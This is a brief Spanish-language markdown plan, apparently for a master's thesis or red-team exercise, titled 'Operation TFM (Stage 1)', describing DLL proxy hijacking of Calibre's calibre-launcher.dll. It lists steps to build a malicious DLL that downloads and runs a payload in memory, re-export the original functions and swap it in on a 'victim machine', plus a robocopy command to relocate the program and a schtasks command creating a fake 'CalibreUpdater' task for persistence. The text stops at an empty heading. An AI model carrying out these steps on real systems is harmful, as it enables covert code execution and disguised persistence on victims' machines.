# Operation TFM (Stage 1) 

- Target DLL: `calibre-launcher.dll`
- [HijackLibs Reference](https://hijacklibs.net/entries/3rd_party/calibre/calibre-launcher.html)

## Road Map

1. Creamos una DLL maliciosa que, al cargarse, descargue el payload y lo ejecute en memoria.
2. Preparamos un archivo proxy.def que contenga las exportaciones de la DLL original
3. Compilamos nuestra DLL maliciosa como proxy DLL, enlazando contra proxy.def y reexportando todas las funciones originales.
4. En la máquina víctima:
    - Renombramos la DLL legítima original.
    - Copiamos nuestra DLL maliciosa en el mismo directorio con el nombre original.

## Mover un ejecutable a una runta con RW para el usuario

```cmd
robocopy "C:\Program Files\Calibre2" "C:\Users\test\Documents\zz" /E /COPY:DAT /R:3 /W:5
```

##  Simular actualizador de software para persistencia

```cmd
schtasks /create /tn "CalibreUpdater" /tr "C:\Users\%USERNAME%\AppData\Local\Calibre\calibre-debug.exe -c \"import time; time.sleep(86400)\"" /sc daily /st 09:00
```

## path